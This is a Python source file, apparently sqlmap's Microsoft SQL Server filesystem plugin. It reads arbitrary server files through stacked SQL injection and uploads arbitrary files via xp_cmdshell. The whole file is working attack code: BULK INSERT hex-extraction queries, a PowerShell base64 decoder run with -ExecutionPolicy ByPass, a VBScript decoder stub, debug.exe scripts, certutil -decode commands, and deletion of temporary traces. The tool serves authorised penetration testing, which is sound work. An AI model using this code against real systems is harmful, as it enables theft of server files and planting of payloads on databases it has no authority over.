#!/usr/bin/env python

"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import ntpath
import os

from lib.core.common import getLimitRange
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import base64encode
from lib.core.convert import hexencode
from lib.core.data import conf
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject

from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        GenericFilesystem.__init__(self)

    def _dataToScr(self, fileContent, chunkName):
        fileLines = []
        fileSize = len(fileContent)
        lineAddr = 0x100
        lineLen = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in xrange(0, len(fileContent), lineLen):
            scrString = ""

            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                strLineChar = hexencode(lineChar)

                if not scrString:
                    scrString = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(lineChar)

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def _updateDestChunk(self, fileContent, tmpPath):
        randScr = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName = randomStr(lowercase=True)
        fileScrLines = self._dataToScr(fileContent, chunkName)

        logger.debug("uploading debug script to %s\%s, please wait.." % (tmpPath, randScr))

        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)

        logger.debug("generating chunk file %s\%s from debug script %s" % (tmpPath, chunkName, randScr))

        commands = ("cd \"%s\"" % tmpPath, "debug < %s" % randScr, "del /F /Q %s" % randScr)
        complComm = " & ".join(command for command in commands)

        self.execCmd(complComm)

        return chunkName

    def stackedReadFile(self, rFile):
        infoMsg = "fetching file: '%s'" % rFile
        logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%shex" % self.fileTblName

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("loading the content of file '%s' into support table" % rFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, rFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: http://support.microsoft.com/kb/104829
        binToHexQuery = """DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)

        if not result:
            result = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "unable to retrieve the content of the "
                errMsg += "file '%s'" % rFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        errMsg = "Microsoft SQL Server does not support file upload with "
        errMsg += "UNION query SQL injection technique"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def _stackedWriteFilePS(self, tmpPath, wFileContent, dFile, fileType):
        infoMsg = "using PowerShell to write the %s file content " % fileType
        infoMsg += "to file '%s'" % dFile
        logger.info(infoMsg)

        encodedFileContent = base64encode(wFileContent)
        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
        encodedBase64FilePath = "%s\%s" % (tmpPath, encodedBase64File)

        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
        randPSScriptPath = "%s\%s" % (tmpPath, randPSScript)

        wFileSize = len(encodedFileContent)
        chunkMaxSize = 1024

        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)

        for i in xrange(0, wFileSize, chunkMaxSize):
            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)

        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % dFile

        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)

        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % dFile)

        commands = ("powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
                    "del /F /Q \"%s\"" % encodedBase64FilePath,
                    "del /F /Q \"%s\"" % randPSScriptPath)
        complComm = " & ".join(command for command in commands)

        self.execCmd(complComm)

    def _stackedWriteFileDebugExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
        infoMsg = "using debug.exe to write the %s " % fileType
        infoMsg += "file content to file '%s', please wait.." % dFile
        logger.info(infoMsg)

        dFileName = ntpath.basename(dFile)
        sFile = "%s\%s" % (tmpPath, dFileName)
        wFileSize = os.path.getsize(wFile)
        debugSize = 0xFF00

        if wFileSize < debugSize:
            chunkName = self._updateDestChunk(wFileContent, tmpPath)

            debugMsg = "renaming chunk file %s\%s to %s " % (tmpPath, chunkName, fileType)
            debugMsg += "file %s\%s and moving it to %s" % (tmpPath, dFileName, dFile)
            logger.debug(debugMsg)

            commands = ("cd \"%s\"" % tmpPath, "ren %s %s" % (chunkName, dFileName), "move /Y %s %s" % (dFileName, dFile))
            complComm = " & ".join(command for command in commands)

            self.execCmd(complComm)
        else:
            debugMsg = "the file is larger than %d bytes. " % debugSize
            debugMsg += "sqlmap will split it into chunks locally, upload "
            debugMsg += "it chunk by chunk and recreate the original file "
            debugMsg += "on the server, please wait.."
            logger.debug(debugMsg)

            for i in xrange(0, wFileSize, debugSize):
                wFileChunk = wFileContent[i:i + debugSize]
                chunkName = self._updateDestChunk(wFileChunk, tmpPath)

                if i == 0:
                    debugMsg = "renaming chunk "
                    copyCmd = "ren %s %s" % (chunkName, dFileName)
                else:
                    debugMsg = "appending chunk "
                    copyCmd = "copy /B /Y %s+%s %s" % (dFileName, chunkName, dFileName)

                debugMsg += "%s\%s to %s file %s\%s" % (tmpPath, chunkName, fileType, tmpPath, dFileName)
                logger.debug(debugMsg)

                commands = ("cd \"%s\"" % tmpPath, copyCmd, "del /F /Q %s" % chunkName)
                complComm = " & ".join(command for command in commands)

                self.execCmd(complComm)

            logger.debug("moving %s file %s to %s" % (fileType, sFile, dFile))

            commands = ("cd \"%s\"" % tmpPath, "move /Y %s %s" % (dFileName, dFile))
            complComm = " & ".join(command for command in commands)

            self.execCmd(complComm)

    def _stackedWriteFileVbs(self, tmpPath, wFileContent, dFile, fileType):
        infoMsg = "using a custom visual basic script to write the "
        infoMsg += "%s file content to file '%s', please wait.." % (fileType, dFile)
        logger.info(infoMsg)

        randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\%s" % (tmpPath, randFile)

        vbs = """Dim inputFilePath, outputFilePath
        inputFilePath = "%s"
        outputFilePath = "%s"
        Set fs = CreateObject("Scripting.FileSystemObject")
        Set file = fs.GetFile(inputFilePath)
        If file.Size Then
            Wscript.Echo "Loading from: " & inputFilePath
            Wscript.Echo
            Set fd = fs.OpenTextFile(inputFilePath, 1)
            data = fd.ReadAll
            fd.Close
            data = Replace(data, " ", "")
            data = Replace(data, vbCr, "")
            data = Replace(data, vbLf, "")
            Wscript.Echo "Fixed Input: "
            Wscript.Echo data
            Wscript.Echo
            decodedData = base64_decode(data)
            Wscript.Echo "Output: "
            Wscript.Echo decodedData
            Wscript.Echo
            Wscript.Echo "Writing output in: " & outputFilePath
            Wscript.Echo
            Set ofs = CreateObject("Scripting.FileSystemObject").OpenTextFile(outputFilePath, 2, True)
            ofs.Write decodedData
            ofs.close
        Else
            Wscript.Echo "The file is empty."
        End If
        Function base64_decode(byVal strIn)
            Dim w1, w2, w3, w4, n, strOut
            For n = 1 To Len(strIn) Step 4
                w1 = mimedecode(Mid(strIn, n, 1))
                w2 = mimedecode(Mid(strIn, n + 1, 1))
                w3 = mimedecode(Mid(strIn, n + 2, 1))
                w4 = mimedecode(Mid(strIn, n + 3, 1))
                If Not w2 Then _
                strOut = strOut + Chr(((w1 * 4 + Int(w2 / 16)) And 255))
                If  Not w3 Then _
                strOut = strOut + Chr(((w2 * 16 + Int(w3 / 4)) And 255))
                If Not w4 Then _
                strOut = strOut + Chr(((w3 * 64 + w4) And 255))
            Next
            base64_decode = strOut
            End Function
        Function mimedecode(byVal strIn)
            Base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
            If Len(strIn) = 0 Then
                mimedecode = -1 : Exit Function
            Else
                mimedecode = InStr(Base64Chars, strIn) - 1
            End If
        End Function""" % (randFilePath, dFile)

        vbs = vbs.replace("    ", "")
        encodedFileContent = base64encode(wFileContent)

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)

        logger.debug("uploading a visual basic decoder stub %s\%s, please wait.." % (tmpPath, randVbs))

        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)

        commands = ("cd \"%s\"" % tmpPath, "cscript //nologo %s" % randVbs,
                     "del /F /Q %s" % randVbs,
                     "del /F /Q %s" % randFile)
        complComm = " & ".join(command for command in commands)

        self.execCmd(complComm)

    def _stackedWriteFileCertutilExe(self, tmpPath, wFile, wFileContent, dFile, fileType):
        infoMsg = "using certutil.exe to write the %s " % fileType
        infoMsg += "file content to file '%s', please wait.." % dFile
        logger.info(infoMsg)

        chunkMaxSize = 500

        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\%s" % (tmpPath, randFile)

        encodedFileContent = base64encode(wFileContent)

        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i+chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)

        logger.debug("decoding the file to %s.." % dFile)

        commands = ("cd \"%s\"" % tmpPath, "certutil -f -decode %s %s" % (randFile, dFile),
                     "del /F /Q %s" % randFile)
        complComm = " & ".join(command for command in commands)

        self.execCmd(complComm)

    def stackedWriteFile(self, wFile, dFile, fileType, forceCheck=False):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system
        self.initEnv()

        self.getRemoteTempPath()

        tmpPath = posixToNtSlashes(conf.tmpPath)
        dFile = posixToNtSlashes(dFile)
        with open(wFile, "rb") as f:
            wFileContent = f.read()

        self._stackedWriteFilePS(tmpPath, wFileContent, dFile, fileType)
        written = self.askCheckWrittenFile(wFile, dFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the custom Visual Basic script technique? [Y/n] "
            choice = readInput(message, default="Y")

            if not choice or choice.lower() == "y":
                self._stackedWriteFileVbs(tmpPath, wFileContent, dFile, fileType)
                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the built-in debug.exe technique? [Y/n] "
            choice = readInput(message, default="Y")

            if not choice or choice.lower() == "y":
                self._stackedWriteFileDebugExe(tmpPath, wFile, wFileContent, dFile, fileType)
                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the built-in certutil.exe technique? [Y/n] "
            choice = readInput(message, default="Y")

            if not choice or choice.lower() == "y":
                self._stackedWriteFileCertutilExe(tmpPath, wFile, wFileContent, dFile, fileType)
                written = self.askCheckWrittenFile(wFile, dFile, forceCheck)

        return written
